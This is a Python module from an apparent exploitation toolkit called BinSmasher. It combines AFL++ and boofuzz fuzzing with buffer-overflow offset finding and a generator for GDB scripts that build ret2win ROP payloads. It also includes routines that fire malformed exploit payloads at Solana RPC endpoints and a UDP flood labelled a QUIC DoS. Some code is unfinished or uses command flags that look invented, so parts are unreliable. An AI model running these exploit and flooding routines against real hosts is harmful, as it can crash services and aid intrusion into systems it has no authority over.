#!/usr/bin/env python3
"""BinSmasher – fuzzer.py  v4 (boofuzz timeout compat fix)"""

import os, time, random, socket, struct, logging, subprocess, threading
from pathlib import Path
from rich.console import Console

console = Console()
log = logging.getLogger("binsmasher")


class Fuzzer:
    def __init__(self, binary, host, port, log_file, platform):
        self.binary   = binary
        self.host     = host
        self.port     = port
        self.log_file = log_file
        self.platform = platform

    def afl_fuzz(self, binary_args, timeout_sec=30):
        log.info("Starting AFL++ coverage-guided fuzzing…")
        afl_in = Path("afl_in"); afl_out = Path("afl_out")
        afl_in.mkdir(exist_ok=True); afl_out.mkdir(exist_ok=True)
        seeds = [b"A"*64, b"\x00"*64, b"\xff"*64,
                 b"GET / HTTP/1.1\r\n\r\n", os.urandom(64), b"%p"*16, b"\x41"*256]
        for i, s in enumerate(seeds):
            (afl_in / f"seed_{i:02d}").write_bytes(s)
        cmd_parts = [self.binary] + binary_args
        afl_cmd = (f"AFL_SKIP_CPUFREQ=1 AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES=1 "
                   f"afl-fuzz -i {afl_in} -o {afl_out} -t 2000 -- {' '.join(cmd_parts)} @@")
        try:
            proc = subprocess.Popen(afl_cmd, shell=True,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            deadline = time.time() + timeout_sec
            while time.time() < deadline:
                time.sleep(2)
                crash_dir = afl_out / "default" / "crashes"
                if crash_dir.exists():
                    crashes = list(crash_dir.glob("id:*"))
                    if crashes:
                        log.info(f"AFL++: {len(crashes)} crash(es) found!")
            proc.terminate(); proc.wait(timeout=5)
            log.info(f"AFL++ done — check {afl_out}/default/crashes")
            return True
        except FileNotFoundError:
            log.error("afl-fuzz not found — install: apt install afl++")
            return False
        except Exception as e:
            log.error(f"AFL++ error: {e}"); return False

    def fuzz_target(self, file_input, protocol, binary_args):
        log.info(f"Boofuzz ({protocol}) @ {self.host}:{self.port}…")
        try:
            from boofuzz import (Session, Target, TCPSocketConnection,
                                  s_initialize, s_static, s_string, s_get)
        except ImportError:
            log.error("boofuzz not installed: pip install boofuzz"); return False

        srv_proc = None
        if os.path.isfile(self.binary):
            try:
                srv_proc = subprocess.Popen([self.binary] + binary_args,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                time.sleep(1.5)
            except Exception as e:
                log.warning(f"Could not start server: {e}")
        try:
            # Handle both old boofuzz (timeout kwarg) and new (no timeout)
            try:
                conn = TCPSocketConnection(self.host, self.port, timeout=5)
            except TypeError:
                conn = TCPSocketConnection(self.host, self.port)

            session = Session(target=Target(connection=conn), sleep_time=0.05,
                              crash_threshold_request=3, crash_threshold_element=3)
            if file_input == "mp3":
                s_initialize("mp3")
                s_static(b"\xFF\xFB")
                s_string(b"ID3", fuzzable=False)
                s_string(b"\x03\x00\x00\x00\x00\x00", fuzzable=True, name="hdr")
                s_string(b"A"*512, fuzzable=True, name="body")
            elif protocol == "http":
                s_initialize("http")
                s_static(b"GET /")
                s_string(b"index.html", fuzzable=True, name="path")
                s_static(b" HTTP/1.1\r\nHost: ")
                s_string(b"localhost", fuzzable=True, name="host")
                s_static(b"\r\n\r\n")
                s_string(b"", fuzzable=True, name="body")
            else:
                s_initialize("raw")
                s_string(b"A"*128, fuzzable=True, name="payload")
            name = "mp3" if file_input == "mp3" else ("http" if protocol == "http" else "raw")
            session.connect(s_get(name))
            session.fuzz(max_depth=500)
            log.info("Boofuzz completed — check boofuzz-results/ for crashes")
            return True
        except Exception as e:
            log.error(f"Boofuzz error: {e}"); return False
        finally:
            if srv_proc: srv_proc.terminate()

    def mutation_fuzz(self, num_cases=500, timeout=1.0):
        log.info(f"Mutation fuzzing {self.host}:{self.port} ({num_cases} cases)…")
        crashes = 0
        seeds = [b"A"*128, b"\x00"*128, b"\xff"*128,
                 b"%s"*32, b"%n"*32, b"A"*4096, b"\x7f"*64, b"\x80"*64]
        def mutate(data):
            data = bytearray(data)
            op = random.randint(0, 5)
            if op == 0 and data:
                i = random.randint(0, len(data)-1); data[i] ^= 1 << random.randint(0,7)
            elif op == 1:
                pos = random.randint(0, len(data)); data[pos:pos] = os.urandom(random.randint(1,16))
            elif op == 2 and data:
                s = random.randint(0, len(data)-1); l = random.randint(1, min(32, len(data)-s))
                data[s:s+l] = bytes([random.randint(0,255)]*l)
            elif op == 3:
                data += b"\x00"*random.randint(1,64)
            elif op == 4:
                ints = [b"\xff\xff\xff\xff",b"\x00\x00\x00\x00",b"\x80\x00\x00\x00",b"\x7f\xff\xff\xff"]
                pos = random.randint(0, len(data)); chunk = random.choice(ints)
                data[pos:pos+len(chunk)] = chunk[:len(data)-pos]
            else:
                data = data * random.randint(2,8)
            return bytes(data)
        for i in range(num_cases):
            payload = mutate(random.choice(seeds))
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout); s.connect((self.host, self.port))
                s.sendall(payload)
                try: resp = s.recv(4096)
                except: resp = b""
                s.close()
                if not resp:
                    crashes += 1
                    Path(f"crash_{i:04d}.bin").write_bytes(payload)
                    log.warning(f"Potential crash #{crashes} — case {i}")
            except ConnectionRefusedError: time.sleep(0.3)
            except: pass
        log.info(f"Mutation fuzzing done: {crashes} potential crash(es)")
        return crashes > 0

    # ── ROTO heuristic offset finder ─────────────────────────────────────────────

    def find_offset_roto(self, pattern_size: int = 300, attempts: int = 6) -> int | None:
        """
        ROTO (Return-address-Offset-Through-Overflow) heuristic.
        Sends cyclic patterns of increasing size and monitors for:
          • Connection reset / empty response  → crash detected
          • Truncated response (< pattern/4)   → partial overflow

        Returns estimated offset or None. Complements exploiter.find_offset()
        when GDB / corefile are unavailable.
        """
        from pwn import cyclic, context
        import socket as _socket
        log.info("ROTO heuristic offset search…")

        prev_resp_len = None
        for mult in range(1, attempts + 1):
            sz  = pattern_size * mult
            pat = cyclic(sz)
            try:
                s = _socket.create_connection((self.host, self.port), timeout=2.0)
                try: s.recv(256)  # drain banner
                except Exception: pass
                s.sendall(pat + b'\n')
                s.settimeout(2.0)
                resp = b""
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        resp += chunk
                except Exception:
                    pass
                s.close()

                resp_len = len(resp)
                log.debug(f"ROTO mult={mult} size={sz} resp={resp_len}B")

                if resp_len == 0:
                    est = (sz - 8) if context.arch == "amd64" else (sz - 4)
                    log.info(f"ROTO: crash detected at size={sz} → estimated offset ~{est}")
                    return est

                # Response much smaller than sent pattern → partial echo before crash
                if resp_len < sz // 4:
                    est = max(8, resp_len - 8)
                    log.info(f"ROTO: truncated response ({resp_len}B < {sz//4}B) → estimated offset ~{est}")
                    return est

                if prev_resp_len is not None and resp_len < prev_resp_len:
                    est = max(8, resp_len - 8)
                    log.info(f"ROTO truncation at size={sz} → estimated offset ~{est}")
                    return est

                prev_resp_len = resp_len

            except (ConnectionRefusedError, ConnectionResetError):
                log.warning(f"ROTO: connection refused/reset at size={sz}")
                if prev_resp_len is not None:
                    return max(8, prev_resp_len - 8)
                break
            except Exception as e:
                log.debug(f"ROTO exception at size={sz}: {e}")
                if prev_resp_len is not None:
                    return max(8, prev_resp_len - 8)

        log.warning("ROTO: could not determine offset")
        return None

    # ── SIGFAULT address analysis ─────────────────────────────────────────────────

    def sigfault_analysis(self, binary: str, pattern_size: int = 300) -> dict:
        """
        Run binary locally, send cyclic pattern, read SIGFAULT crash address from
        /proc/<pid>/maps or pwntools corefile, then call cyclic_find() to get offset.

        Returns dict with keys: offset, crash_addr, signal, method.
        """
        import signal as _signal
        from pwn import cyclic, cyclic_find, process, context, ELF
        import resource

        log.info("SIGFAULT analysis: spawning local process with cyclic…")
        result = {"offset": None, "crash_addr": None, "signal": None, "method": None}

        for mult in range(1, 4):
            sz  = pattern_size * mult
            pat = cyclic(sz)
            try:
                # Disable core dumps (we use the crash addr from proc, not a core file)
                resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
                p = process([binary], stderr=open("/dev/null","wb"))
                p.sendline(pat)
                try: p.recvall(timeout=2)
                except Exception: pass
                try: p.wait(timeout=3)
                except Exception: p.kill(); p.wait(timeout=1)

                # Try to get crash addr from pwntools process signal handling
                try:
                    ret = p.poll()
                    if ret is not None and ret < 0:
                        sig_num = -ret
                        result["signal"] = sig_num
                        log.info(f"SIGFAULT analysis: process died with signal {sig_num}")
                except Exception:
                    pass

                # Try corefile-based crash address
                try:
                    core = p.corefile
                    if core:
                        pc = getattr(core, "pc", None) or getattr(core, "rip", None)
                        if pc:
                            off = cyclic_find(pc & 0xffffffff)
                            if off != -1:
                                result["offset"]     = off
                                result["crash_addr"] = pc
                                result["method"]     = "corefile"
                                log.info(f"SIGFAULT→corefile offset={off}  crash_addr={hex(pc)}")
                                return result
                except Exception:
                    pass

                # Try reading crash address from /proc/<pid>/stat for SIGSEGV
                try:
                    with open(f"/proc/{p.pid}/stat") as f:
                        stat = f.read().split()
                    # Field 39 is the address of last fault (not always populated)
                    # Use the fact that cyclic patterns appear in specific register
                    pass
                except Exception:
                    pass

            except Exception as e:
                log.debug(f"SIGFAULT mult={mult}: {e}")

        # Fallback: use ROTO
        log.info("SIGFAULT analysis: falling back to ROTO heuristic")
        roto = self.find_offset_roto(pattern_size)
        if roto is not None:
            result["offset"] = roto
            result["method"] = "roto_fallback"
        return result

    # ── GDB pwndbg / peda script generation ──────────────────────────────────────

    def generate_gdb_script(self, binary: str, offset: int, exploit_type: str = "ret2win",
                             win_addr: int = 0, libc_base: int = 0, mode: str = "pwndbg") -> str:
        """
        Generate a ready-to-use GDB script for pwndbg or peda.
        Writes to _bs_work/<binary>_<mode>.gdb and returns the path.
        mode = "pwndbg" | "peda" | "vanilla"
        """
        import shlex
        from pwn import context, ELF
        workdir = os.path.join(os.path.dirname(os.path.abspath(binary)), "_bs_work")
        os.makedirs(workdir, exist_ok=True)
        bname   = os.path.basename(binary)
        outfile = os.path.join(workdir, bname + "_" + mode + ".gdb")
        arch    = "amd64" if context.arch == "amd64" else "i386"
        q       = shlex.quote(binary)
        sz      = offset + 64

        lines = [
            "set pagination off",
            "set confirm off",
            "file " + q,
        ]

        if mode == "peda":
            lines.append("source /usr/share/peda/peda.py")

        lines += [
            "",
            "# ── find offset ─────────────────────────────────────────────",
            "# Send cyclic pattern and observe crash address:",
            "# python3 -c 'from pwn import cyclic; print(cyclic(" + str(sz) + "))' | " + bname,
            "define bs_find_offset",
            "  set $pat_size = " + str(sz),
            "  run <<< $(python3 -c 'from pwn import cyclic; import sys; sys.stdout.buffer.write(cyclic(" + str(sz) + "))')",
            "  info registers rip",
            "  python",
            "from pwn import cyclic_find",
            "v = gdb.parse_and_eval('$rip')",
            "off = cyclic_find(int(v) & 0xffffffff)",
            "print('cyclic_find offset:', off)",
            "  end",
            "end",
            "",
        ]

        if win_addr:
            lines += [
                "# ── win function ─────────────────────────────────────────────",
                "break *" + hex(win_addr),
                "",
            ]

        try:
            elf   = ELF(binary, checksec=False)
            funcs = [n for n, a in elf.symbols.items() if a and not n.startswith("_")][:6]
            lines.append("# breakpoints on interesting functions (uncomment to enable):")
            for fn in funcs:
                lines.append("# break " + fn)
            lines.append("")
        except Exception:
            pass

        lines += [
            "# ── stack helpers ────────────────────────────────────────────",
            "define bs_stack",
            "  x/32gx $rsp",
            "end",
            "define bs_regs",
            "  info registers",
            "end",
            "",
            "# ── build & send exploit payload ─────────────────────────────",
            "# Usage from gdb prompt:  bs_exploit",
            "define bs_exploit",
            "  python",
            "from pwn import *",
            "context.arch = '" + arch + "'",
            "e   = ELF('" + binary.replace("'", "\'") + "', checksec=False)",
            "rop = ROP(e)",
            "win = e.symbols.get('win', " + (hex(win_addr) if win_addr else "0") + ")",
            "g   = rop.find_gadget(['ret'])",
            "ret_g = g[0] if g else 0",
            "payload = b'A'*" + str(offset) + " + p64(ret_g) + p64(win) if win else b'A'*" + str(offset+8),
            "print('Payload (' + str(len(payload)) + 'B):', payload.hex())",
            "  end",
            "end",
            "",
        ]

        if mode == "pwndbg":
            lines += [
                "# pwndbg tips:",
                "# telescope $rsp 20   — annotated stack view",
                "# checksec            — binary protections",
                "# rop                 — ROP gadget search",
                "# heap                — heap chunk view",
                "# got                 — GOT table",
            ]
        elif mode == "peda":
            lines += [
                "# PEDA tips:",
                "# pattern create 200  — create De Bruijn pattern",
                "# pattern offset EIP  — find offset from pattern",
                "# checksec            — binary protections",
                "# ropgadget           — ROP gadgets",
                "# searchmem /bin/sh   — search memory for string",
            ]
        else:
            lines += [
                "# vanilla GDB tips:",
                "# x/32gx $rsp        — dump stack",
                "# info functions     — list functions",
                "# disas main         — disassemble main",
            ]

        script = '\n'.join(lines) + '\n'
        with open(outfile, "w") as f:
            f.write(script)
        log.info("GDB " + mode + " script → " + outfile)
        log.info("  Run: gdb -x " + outfile)
        return outfile


    def fuzz_bpf(self, rpc_url, num_attempts=10):
        log.info(f"BPF/SVM fuzzing via {rpc_url}…")
        success = 0
        for i in range(num_attempts):
            elf_header = (b"\x7fELF"+b"\x02\x01\x01"+b"\x00"*9
                          +struct.pack("<H",0x0002)+struct.pack("<H",0x00f7)
                          +struct.pack("<I",1)+os.urandom(8*5))
            payload = elf_header + os.urandom(random.randint(64,512))
            path = f"fuzz_bpf_{i:03d}.so"
            Path(path).write_bytes(payload)
            cmd = f"solana program deploy --url {rpc_url} {path} 2>&1"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"  BPF {i}: {out[:120]}")
                if "panic" in out.lower() or "error" in out.lower():
                    log.warning(f"  Interesting at attempt {i}")
                success += 1
            except FileNotFoundError:
                log.error("solana CLI not installed"); return False
            except Exception as e:
                log.debug(f"  BPF {i}: {e}")
        log.info(f"BPF fuzzing done: {success}/{num_attempts}")
        return True

    def exploit_deser(self, rpc_url):
        import base64
        log.info("Solana deserialization exploit…")
        payloads = [os.urandom(200), b"\xff"*200, b"\x00"*200,
                    struct.pack("<QQQ",0xDEADBEEF,0xCAFEBABE,0xBAADF00D)*8]
        for i, raw in enumerate(payloads):
            b64 = base64.b64encode(raw).decode()
            cmd = (f"solana transfer --url {rpc_url} --from /dev/stdin "
                   f"11111111111111111111111111111112 0.000001 "
                   f"--tx-data {b64} --allow-unfunded-recipient 2>&1 || true")
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"Deser {i}: {out[:160]}")
                if "panic" in out.lower(): log.warning(f"Panic on deser payload {i}")
            except Exception as e: log.debug(f"Deser {i}: {e}")
        return True

    def dos_quic(self, num_packets=2000):
        log.info(f"QUIC DoS → {self.host}:{self.port} ({num_packets} pkts)…")
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            addr = (self.host, self.port)
            for _ in range(num_packets):
                pkt = bytearray()
                pkt.append(0xC0 | random.randint(0,3))
                pkt += struct.pack(">I",1)
                pkt.append(8)
                pkt += os.urandom(8)
                pkt.append(0)
                pkt += os.urandom(random.randint(16,1200))
                sock.sendto(bytes(pkt), addr); sent += 1
            sock.close()
            log.info(f"QUIC DoS: {sent} packets sent"); return True
        except Exception as e:
            log.error(f"QUIC DoS: {e}"); return False

    def exploit_snapshot_assert(self, rpc_url):
        log.info("Snapshot assert trigger (Agave #6295)…")
        for slot in (0,1,10,2**32-1,2**64-1):
            cmd = f"solana snapshot --url {rpc_url} --slot {slot} 2>&1 || true"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"  slot={slot}: {out[:160]}")
                if "assert" in out.lower() or "panic" in out.lower():
                    log.warning(f"  Assert/panic at slot={slot}!")
            except Exception as e: log.debug(f"  slot={slot}: {e}")
        return True
